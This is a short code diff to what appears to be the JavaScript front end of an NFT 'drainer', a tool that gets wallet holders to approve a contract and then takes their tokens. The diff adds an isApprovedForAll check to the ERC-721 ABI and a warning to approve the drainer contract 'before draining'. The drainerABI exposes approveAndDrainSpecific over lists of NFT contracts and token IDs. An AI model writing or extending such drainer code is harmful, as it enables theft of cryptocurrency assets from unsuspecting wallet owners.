@@ -124,7 +124,8 @@
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
       "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
-      "function name() view returns (string)"
+      "function name() view returns (string)",
+      "function isApprovedForAll(address owner, address operator) view returns (bool)" // Added
     ];
     const drainerABI = [
       "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
@@ -178,7 +179,7 @@
             const name = await contract.name();
             const balance = await contract.balanceOf(user);
             summary += `🖼️ ${name}: ${balance} NFT(s)\n`;
-            // Optional: Prompt user to approve if not already approved
+            // Check if drainer is approved
             if (balance > 0 && !(await contract.isApprovedForAll(user, drainerContract))) {
               summary += `⚠️ Approve ${drainerContract} for ${name} before draining.\n`;
             }
